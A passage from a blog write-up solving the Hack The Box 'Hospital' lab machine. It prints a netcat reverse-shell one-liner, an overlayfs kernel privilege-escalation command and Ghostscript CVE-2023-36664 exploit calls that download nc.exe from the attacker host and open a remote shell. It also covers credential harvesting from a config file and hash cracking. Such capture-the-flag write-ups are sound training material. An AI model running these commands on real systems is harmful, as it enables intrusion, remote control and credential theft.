Due to I/O error system</p><p><img src=/p/hospital-writeup/Hos_Pic/image-9.png width=1880 height=343 srcset="/p/hospital-writeup/Hos_Pic/image-9_hu8df1c61004781422a1c252e19c900ba1_203501_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-9_hu8df1c61004781422a1c252e19c900ba1_203501_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=548 data-flex-basis=1315px></p><p><img src=/p/hospital-writeup/Hos_Pic/image-6.png width=1755 height=384 srcset="/p/hospital-writeup/Hos_Pic/image-6_huf03952c3233f10791dbc10a3433cb2c9_68294_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-6_huf03952c3233f10791dbc10a3433cb2c9_68294_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=457 data-flex-basis=1096px></p><p><a class=link href=https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8 target=_blank rel=noopener>https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8</a> &ndash;> <a class=link href=https://github.com/flozz/p0wny-shell target=_blank rel=noopener>https://github.com/flozz/p0wny-shell</a></p><p><a class=link href=https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8 target=_blank rel=noopener>https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8</a></p><p>However, an IO problem becomes evident from the screenshot, rendering the attainment of a reverse shell unattainable. Consequently, we opt to employ P0nyshell to address this issue effectively.</p><p><img src=/p/hospital-writeup/Hos_Pic/image-10.png width=1315 height=612 srcset="/p/hospital-writeup/Hos_Pic/image-10_hu4ac3766ea9f61b94e7d62dd9c7342f80_76858_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-10_hu4ac3766ea9f61b94e7d62dd9c7342f80_76858_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=214 data-flex-basis=515px></p><p><img src=/p/hospital-writeup/Hos_Pic/image-11.png width=1885 height=769 srcset="/p/hospital-writeup/Hos_Pic/image-11_hud7038aec72d894c742fb790ddb214c57_51009_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-11_hud7038aec72d894c742fb790ddb214c57_51009_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=245 data-flex-basis=588px></p><h2 id=first-foothold>First FootHold</h2><p>Ww executed this command and get reverse shell !</p><p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.10.14.22 1234 >/tmp/f</code></p><p>After establishing connectivity, my initial reflex is to examine any configuration files associated with the service on port 443 discovered earlier. However, upon reflection, this approach seems misguided, as the machine is identified as Windows based on the Nmap scan results. Consequently, we abandon this line of inquiry.</p><p><code>www-data@webserver:/var/www/html$ find / -name webmail 2>/dev/null www-data@webserver:/var/www/html$ find / -name roundcube 2>/dev/null</code> &ndash;> nothing</p><p>Though credentials for MySQL are discovered early on, attempts to connect to it prove futile, hinting at the possibility of a potential rabbit hole.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>webserver</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>$</span> <span class=n>cat</span> <span class=n>config</span><span class=o>.</span><span class=n>php</span> 
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=o>/*</span> <span class=n>Database</span> <span class=n>credentials</span><span class=o>.</span> <span class=n>Assuming</span> <span class=n>you</span> <span class=n>are</span> <span class=n>running</span> <span class=n>MySQL</span>
</span></span><span class=line><span class=cl><span class=n>server</span> <span class=n>with</span> <span class=n>default</span> <span class=n>setting</span> <span class=p>(</span><span class=n>user</span> <span class=s1>&#39;root&#39;</span> <span class=n>with</span> <span class=n>no</span> <span class=n>password</span><span class=p>)</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl><span class=n>define</span><span class=p>(</span><span class=s1>&#39;DB_SERVER&#39;</span><span class=p>,</span> <span class=s1>&#39;localhost&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>define</span><span class=p>(</span><span class=s1>&#39;DB_USERNAME&#39;</span><span class=p>,</span> <span class=s1>&#39;root&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>define</span><span class=p>(</span><span class=s1>&#39;DB_PASSWORD&#39;</span><span class=p>,</span> <span class=s1>&#39;my$qls3rv1c3!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>define</span><span class=p>(</span><span class=s1>&#39;DB_NAME&#39;</span><span class=p>,</span> <span class=s1>&#39;hospital&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=o>/*</span> <span class=n>Attempt</span> <span class=n>to</span> <span class=n>connect</span> <span class=n>to</span> <span class=n>MySQL</span> <span class=n>database</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>link</span> <span class=o>=</span> <span class=n>mysqli_connect</span><span class=p>(</span><span class=n>DB_SERVER</span><span class=p>,</span> <span class=n>DB_USERNAME</span><span class=p>,</span> <span class=n>DB_PASSWORD</span><span class=p>,</span> <span class=n>DB_NAME</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>Check</span> <span class=n>connection</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>link</span> <span class=o>===</span> <span class=bp>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>die</span><span class=p>(</span><span class=s2>&#34;ERROR: Could not connect. &#34;</span> <span class=o>.</span> <span class=n>mysqli_connect_error</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=first-privilege-escalation>First Privilege Escalation</h2><p>After several unsuccessful attempts, I revisit my notes and initiate a privilege escalation at the source. This involves inspecting the SUID binaries, followed by a na√Øve execution of sudo -l, and subsequently checking the kernel version. This effort eventually leads to the identification of our next exit route: <code>CVE-2023-032629.</code></p><p>We execute this payload to get root privilege because kernel version was old <code>(5.19.0)</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>unshare -rm sh -c <span class=s2>&#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&#34;</span> <span class=o>&amp;&amp;</span> u/python3 -c <span class=s1>&#39;import os;os.setuid(0);os.system(&#34;cp /bin/bash /var/tmp/bash &amp;&amp; chmod 4755 /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash&#34;)&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Subsequently, while exploring the files as root (and not NT\Authority), three interesting usernames are encountered: google, josharian, mdlayher, vishvananda from /home/drwilliams/go/pkg/mod/github.com.<br>Unfortunately, nothing of significance is discovered, save for a Go project.</p><p>Capitalizing on my newfound root status, I seize the opportunity to retrieve Dr. Williams&rsquo; hash and proceed to crack it using our trusty ally John.</p><p><code>$6$uWBSe***blablablasomerandomstuffs***W192y/:19612:0:99999:7:::</code></p><p><img src=/p/hospital-writeup/Hos_Pic/image-12.png width=1474 height=754 srcset="/p/hospital-writeup/Hos_Pic/image-12_hua05d3abc3ef8a01d36132a43c4da66dc_210164_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-12_hua05d3abc3ef8a01d36132a43c4da66dc_210164_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=195 data-flex-basis=469px></p><p>and our best friend John gave us the password !</p><h2 id=2supndsup-foothold>2<sup>nd</sup> FootHold</h2><p>With the password successfully obtained, we can finally return to the website on port 443. Upon logging in, we stumble upon an intriguing email tasking us with designing something in .eps format for viewing by GhostScript.</p><p><img src=/p/hospital-writeup/Hos_Pic/image-13.png width=1905 height=837 srcset="/p/hospital-writeup/Hos_Pic/image-13_hu3571bdd648b3fb24eb93fd789aa0565b_93756_480x0_resize_box_3.png 480w, /p/hospital-writeup/Hos_Pic/image-13_hu3571bdd648b3fb24eb93fd789aa0565b_93756_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=227 data-flex-basis=546px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Dear Lucy,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>I wanted to remind you that the project for lighter, cheaper and
</span></span><span class=line><span class=cl>environmentally friendly needles is still ongoing üíâ. You are the one in
</span></span><span class=line><span class=cl>charge of providing me with the designs for these so that I can take
</span></span><span class=line><span class=cl>them to the 3D printing department and start producing them right away.
</span></span><span class=line><span class=cl>Please make the design in an &#34;.eps&#34; file format so that it can be well
</span></span><span class=line><span class=cl>visualized with GhostScript.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Best regards,
</span></span><span class=line><span class=cl>Chris Brown.
</span></span></code></pre></td></tr></table></div></div><p><em>Notice that .eps &ndash;> adobe format stand for encapsulated postscript</em></p><p>After reading the email, it is clear that we need to send him a .eps file. Fortunately, the first GitHub link we found provides a Proof of Concept (PoC) on an exploit that allows us to achieve Remote Code Execution (RCE) that&rsquo;s the <strong>CVE-2023‚Äì36664</strong>.<br>To accomplish this, we ensure that the target machine has Netcat installed, so we send it first, and then proceed to use the sent file (Netcat) to execute commands.</p><p>Some ref :<br><a class=link href=https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git target=_blank rel=noopener>https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git</a></p><p><a class=link href="https://www.youtube.com/watch?v=Gh-A49rqrJI&amp;ab_channel=%C3%81kosJakab" target=_blank rel=noopener>https://www.youtube.com/watch?v=Gh-A49rqrJI&ab_channel=%C3%81kosJakab</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 CVE_2023_36664_exploit.py --inject --payload <span class=s2>&#34;curl http://10.10.14.7/nc.exe -o nc.exe&#34;</span> --filename file.eps
</span></span></code></pre></td></tr></table></div></div><p>and,</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 CVE_2023_36664_exploit.py --inject --payload <span class=s2>&#34;nc.exe 10.10.14.7 1234 -e cmd&#34;</span> --filename rv.eps
</span></span></code></pre></td></tr></table></div></div><p>Once this is done, we reply to this email, clicking on the paperclip icon (attachment), selecting the file, and then sending it in return.</p><p><img src=/p/hospital-writeup/image-4.png width=800 height=228 srcset="/p/hospital-writeup/image-4_hu4af202d0cb5bf57c78fb8d4a60b9abba_25387_480x0_resize_box_3.png 480w, /p/hospital-writeup/image-4_hu4af202d0cb5bf57c78fb8d4a60b9abba_25387_1024x0_resize_box_3.png 1024w" loading=lazy alt="Send our netcat.exe" class=gallery-image data-flex-grow=350 data-flex-basis=842px></p><p>We patiently wait for her to open the email,</p><p><img src=/p/hospital-writeup/image-2.png width=1885 height=766 srcset="/p/hospital-writeup/image-2_huba2e9a8d03b4d542c8e3a486a3922f1e_144902_480x0_resize_box_3.png 480w, /p/hospital-writeup/image-2_huba2e9a8d03b4d542c8e3a486a3922f1e_144902_1024x0_resize_box_3.png 1024w" loading=lazy alt="Process to reply and send our payloads" class=gallery-image data-flex-grow=246 data-flex-basis=590px></p><p>and we obtain a reverse shell.</p><p><img src=/p/hospital-writeup/image-5.png width=933 height=310 srcset="/p/hospital-writeup/image-5_hu87df8fbb037675dc502b3fe2f6af19eb_65969_480x0_resize_box_3.png 480w, /p/hospital-writeup/image-5_hu87df8fbb037675dc502b3fe2f6af19eb_65969_1024x0_resize_box_3.png 1024w" loading=lazy alt="Got revershell as DrBrown" class=gallery-image data-flex-grow=300 data-flex-basis=722px></p><h2 id=2supndsup-privilege-esclation>2<sup>nd</sup> Privilege Esclation</h2><p>Upon connection, we notice a batch file containing Dr. Brown&rsquo;s credentials. Although not yet attempted, I assume we can connect using Evil-WinRM and obtain a more stable shell.</p><p><img src=/p/hospital-writeup/image-7.png width=1897 height=171 srcset="/p/hospital-writeup/image-7_hu69f05eb2eb65f22a87725199e910a938_66797_480x0_resize_box_3.png 480w, /p/hospital-writeup/image-7_hu69f05eb2eb65f22a87725199e910a938_66797_1024x0_resize_box_3.png 1024w" loading=lazy alt="Retrieve DrBrown&rsquo;s password from bat&rsquo;s script" class=gallery-image data-flex-grow=1109 data-flex-basis=2662px></p><p>back to nmap ;<br>We utilize these credentials to enumerate what we can. With nothing significant found in SMB, we pivot towards rpcclient.<br>After several commands yield no fruitful results</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rpcclient 10.10.11.241 -U <span class=s2>&#34;drbrown&#34;</span>
</span></span></code></pre></td></tr></table></div></div><ul><li><code>tshareenum</code> &ndash;> acces denied \</li><li><code>enum</code> &ndash;> command not found</li><li><code>enumdomains</code> &ndash;> none intersting</li><li><code>enumdomgroups</code> &ndash;> retrieve rid of admin</li><li><code>querygroup</code> <rid admin>&ndash;> some information</li></ul><p>Next, I discovered the necessary command from this remarkable website.
<a class=link href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration?source=post_page-----791ad6dd24ed--------------------------------" target=_blank rel=noopener>https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration?source=post_page-----791ad6dd24ed--------------------------------</a></p><p>, we then utilize the <code>querydispinfo</code> command and notice that Administrator Information is shared with the Guest..</p><p><img src=/p/hospital-writeup/image-9.png width=1568 height=437 srcset="/p/hospital-writeup/image-9_hu9c2da5f945ca3c3279dfa355137c2106_239412_480x0_resize_box_3.png 480w, /p/hospital-writeup/image-9_hu9c2da5f945ca3c3279dfa355137c2106_239412_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=358 data-flex-basis=861px></p><p>Knowing that this machine hosts a web application, we exploit the C drive and gain access to the directory of the web application.<br>Upon using <code>icacls</code>, it reveals the permissions of the accounts on this folder.</p><p><img src=/p/hospital-writeup/image-11.png width=619 height=385 srcset="/p/hospital-writeup/image-11_hud77c0b1bdec1ca3049fbbc0ed8153c42_73459_480x0_resize_box_3.png 480w, /p/hospital-writeup/image-11_hud77c0b1bdec1ca3049fbbc0ed8153c42_73459_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=160 data-flex-basis=385px></p><p>We know that this machine is running a web application so we exploit C drive and we have the directory of web application. Upon using icacls, it tells us the permission of the accounts on this folder.</p><p><img src=/p/hospital-writeup/image-13.png width=619 height=593 srcset="/p/hospital-writeup/image-13_hu8fa3ae32af05bc9d3b00ec3cf6a208bf_135284_480x0_resize_box_3.png 480w, /p/hospital-writeup/image-13_hu8fa3ae32af05bc9d3b00ec3cf6a208bf_135284_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=104 data-flex-basis=250px></p><p>To locate my reverse shell I used this forum : <a class=link href=https://stackoverflow.com/questions/16772198/how-do-i-test-a-website-using-xampp target=_blank rel=noopener>https://stackoverflow.com/questions/16772198/how-do-i-test-a-website-using-xampp</a></p><p>We set up a reverse shell, hoping to obtain a connection with elevated privileges, given that we have access.</p><p><img src=/p/hospital-writeup/image-14.png width=1362 height=607 srcset="/p/hospital-writeup/image-14_huf0ac3c6ac73a8f60b8e1d89c6bd4b289_53193_480x0_resize_box_3.png 480w, /p/hospital-writeup/image-14_huf0ac3c6ac73a8f60b8e1d89c6bd4b289_53193_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=224 data-flex-basis=538px></p><p>Box forums provide some guidance, certain hints or questions can be too revealing. Therefore, I&rsquo;d like to express my gratitude to this particular source that crafted a writeup containing only hints. It proved incredibly helpful during my privilege escalation phase.</p><p>Thank a lot : <a class=link href=https://svadhyayan.com/htb-hospital-writeup/ target=_blank rel=noopener>https://svadhyayan.com/htb-hospital-writeup/</a></p></section><footer class=article-footer><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><section class=article-lastmod><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<span>Last updated on Feb 08, 2024 00:00 UTC</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/bizness-writeup/><div class=article-image><img src=/p/bizness-writeup/cover.fb1237e4f827067dff97ad2c67ba754d_huaea1c6500f5f6ef73de368cd5cb02c59_88074_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post Bizness Writeup" data-key="Bizness Writeup" data-hash="md5-+xI35PgnBn3/l60sZ7p1TQ=="></div><div class=article-details><h2 class=article-title>Bizness Writeup</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2024 ShaanksFR Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>